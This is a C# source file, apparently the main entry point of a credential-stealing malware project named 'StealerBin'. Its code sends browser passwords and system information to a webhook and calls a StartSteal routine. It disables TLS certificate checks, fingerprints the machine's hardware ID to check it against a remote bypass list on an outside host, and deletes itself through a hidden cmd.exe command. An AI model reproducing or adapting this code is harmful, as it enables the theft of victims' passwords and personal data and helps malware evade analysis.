using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace StealerBin
{
    public class Hook
	{
        [STAThread]
		private static void Main()
		{
            #region owoo
            if (gay().Contains(HWID()))
            {
                File.WriteAllText("C:/temp/dont_remove_me", null);
                if (MessageBox.Show("This is a stealer!\nDo you want to send dummy info?", "Stealer detected | Protection by itroublvehacker.ml", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    try
                    {
                        new WebClient().DownloadFile("https://itroublvehacker.cf/dummyinfo", "C:/temp/John_Passwords.txt");
                        new API(API.Hook)
                        {
                            _name = API.name,
                            _ppUrl = API.pfp
                        }.SendPasswords("**Browser Password!**",  "C:/temp/John_Passwords.txt");
                    }
                    catch (Exception ex)
                    {
                        if (MessageBox.Show(API.Hook, "", MessageBoxButtons.YesNo) == DialogResult.Yes)
                        {
                            Clipboard.SetText(API.Hook);
                        }
                        MessageBox.Show(ex.Message);
                    }
                }
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
                Environment.Exit(0);
            }
            #endregion
            if (File.Exists("C:/temp/System_INFO.txt"))
            {
                new API(API.Hook)
                {
                    _name = API.name,
                    _ppUrl = API.pfp
                }.SendSysInfo("**SYSTEM INFO**", "C:/temp/System_INFO.txt");
                File.Delete("C:/temp/System_INFO.txt");
            }
            File.Delete("C:/temp/finalres.vbs");
            File.Delete("C:/temp/WebBrowserPassView.exe");
            API.Passwords();
            Stealer.StartSteal();
            Environment.Exit(0);
		}
        #region Files Extract & >º-yËb¢
        public static string gay()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            try
            {
                var request = new HttpClient();
                {
                    request.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", "enter text here");
                    var response = request.GetAsync("https://itroublvehacker.cf/bypass_stealer");
                    return response.Result.Content.ToString();
                }
            }
            catch
            {
                return null;
            }
        }
        public static string HWID()
        {
            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                string mGUID = string.Empty;
                using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
                {
                    ManagementObjectCollection mbsList = null;
                    ManagementObjectSearcher mbs = new ManagementObjectSearcher("Select * From Win32_processor");
                    mbsList = mbs.Get();
                    string CPUid = string.Empty;
                    foreach (ManagementObject mo in mbsList)
                    {
                        CPUid = mo["ProcessorID"].ToString();
                    }
                    ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
                    ManagementObjectCollection moc = mos.Get();
                    string MBid = string.Empty;
                    foreach (ManagementObject mo in moc)
                    {
                        MBid = (string)mo["SerialNumber"];
                    }
                    mGUID = Convert.ToString(registryKey2.GetValue("MachineGuid"));
                    string owo = string.Empty;
                    owo = MBid + mGUID + CPUid;
                    var id = Encoding.UTF8.GetBytes(owo);
                    owo = Convert.ToBase64String(id);
                    return owo;
                }
            }
        }
        #endregion
    }
}
